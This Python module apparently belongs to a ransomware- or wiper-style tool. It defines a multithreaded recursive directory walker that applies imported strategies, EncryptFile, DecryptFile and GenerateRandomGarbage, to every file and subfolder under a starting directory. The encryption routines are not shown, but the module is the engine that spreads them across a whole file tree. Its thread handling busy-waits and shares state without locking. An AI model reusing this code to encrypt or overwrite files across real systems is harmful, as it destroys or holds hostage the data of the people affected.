from threading import Thread
from queue import Queue
from typing import Any

import os

from .strategies import Strategy
from .strategies import StrategyType
from .strategies.encrypt import EncryptFile
from .strategies.decrypt import DecryptFile
from .strategies.generate_garbage import GenerateRandomGarbage


class LoopingThread:
    def __init__(self, handler: Any, strategy: Strategy, directory: str) -> None:
        self._handler = handler
        self._strategy = strategy
        self._directory = directory
        self._thread = None
        
    def _loop_through(self) -> None:
        print(f"[*] '{self._directory}'")
        for file in os.listdir(self._directory):
            file_path = f"{self._directory}\\{file}"
            if os.path.isfile(file_path):
                if self._strategy.TYPE == StrategyType.FILE:
                    self._strategy.execute(file_path)
            if os.path.isdir(file_path):
                if self._strategy.TYPE == StrategyType.DIRECTORY:
                    self._strategy.execute(file_path)
                self._handler.append_thread(LoopingThread(self._handler, self._strategy, file_path))
            
        self._handler.remove_thread(self)
        self._thread = None
        
    def start(self) -> None:
        self._thread = Thread(target=self._loop_through)
        self._thread.start()
        
class LoopThreadHandler:
    def __init__(self, max_threads=10) -> None:
        self._queue = Queue()
        self._active_threads = []
        self._max_threads = max_threads
        self._internal_thread = Thread(target=self._run_threads)
        
    def _run_threads(self) -> None:
        print("[*] Running internal thread!")
        while True:
            if not len(self._active_threads) < self._max_threads:
                continue
                
            if self._queue.qsize() != 0:
                self._active_threads.append(self._queue.get())
                self._active_threads[-1].start()
        
    def append_thread(self, thread: LoopingThread) -> None:
        if not isinstance(thread, LoopingThread):
            return None
        self._queue.put(thread)
        
    def remove_thread(self, thread: LoopingThread) -> None:
        self._active_threads.remove(thread)
        
    def run(self, initial_thread: LoopingThread) -> None:
        if len(self._active_threads) != 0:
            return None
        if self._queue.qsize() != 0:
            return None
            
        self.append_thread(initial_thread)
        self._internal_thread.start()
